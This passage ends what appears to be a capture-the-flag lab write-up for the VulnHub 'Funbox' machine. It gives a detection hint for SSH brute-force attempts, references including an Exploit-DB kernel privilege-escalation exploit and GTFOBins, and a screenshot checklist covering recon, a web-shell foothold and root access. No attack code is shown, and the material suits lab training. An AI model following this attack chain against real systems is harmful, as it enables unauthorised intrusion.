  executed, and on `hydra`-style SSH auth failures from a single source.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: https://vulnhub.com/entry/funbox-ctf,546/
- Exploit-DB 45010 — Linux Kernel 4.4.0 'BPF' Local Privilege Escalation:
  https://www.exploit-db.com/exploits/45010
- CVE-2017-16995 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2017-16995
- GTFOBins: https://gtfobins.github.io/
- Community writeups consulted:
  - [Funbox: CTF 靶机测试 (hirak0)](https://www.cnblogs.com/hirak0/articles/16086261.html)
  - [Infosec Institute — FUNBOX: VulnHub CTF walkthrough](https://www.infosecinstitute.com/resources/capture-the-flag/funbox-vulnhub-ctf-walkthrough)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap results + `/ROBOTS.TXT` discovery
- [ ] `images/03-foothold.png` — the upload form and web shell RCE
- [ ] `images/04-root-flag.png` — kernel exploit and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
